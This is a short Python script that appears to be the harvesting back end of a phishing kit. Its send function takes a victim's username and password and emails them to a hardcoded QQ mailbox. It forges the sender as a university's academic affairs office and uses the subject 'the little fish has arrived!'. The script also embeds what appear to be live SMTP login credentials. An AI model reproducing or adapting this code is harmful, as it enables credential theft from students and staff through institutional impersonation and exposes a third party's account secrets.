# -*- coding: utf-8 -*-
from email.mime.text import MIMEText
import smtplib
def send(username,password):
        con=username+"+"+password
        content=con
        stmp_server="smtp.qq.com"
        from_email="2097000769@qq.com"
        email_pwd="xflfojlnhhftbacb"
        toaddr=["2097000769@qq.com"]
        msg=MIMEText(content,'html','utf-8')
        msg['From']='XX大学教务处<[email]XXXjwc@XXX.edu.cn[/email]>'
        msg['Subject']='小鱼儿到了！'
        server=smtplib.SMTP_SSL(stmp_server,465)
        server.login(from_email,email_pwd)
        server.set_debuglevel(1)
        server.sendmail(from_email,toaddr,msg.as_string())
        server.quit()